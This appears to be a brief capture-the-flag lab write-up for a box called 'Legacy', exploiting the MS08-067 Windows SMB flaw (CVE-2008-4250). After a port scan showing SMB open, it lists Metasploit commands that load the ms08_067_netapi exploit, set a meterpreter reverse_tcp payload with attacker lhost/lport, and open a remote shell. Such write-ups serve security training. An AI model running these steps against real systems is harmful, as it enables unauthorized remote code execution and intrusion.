# Legacy Write-Up

Easy

Tags: 
`CVE-2008-4250`

## Intro

1. Use exploit/windows/smb/ms08_067_netapi

## Exploit

### Port scanning

```
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
```

Microsoft Windows Server - Code Execution (MS08-067)

```
use exploit/windows/smb/ms08_067_netapi
```

```
set payload windows/x64/meterpreter/reverse_tcp
```

rhosts, lhost, lport > run

```
meterpreter > shell
```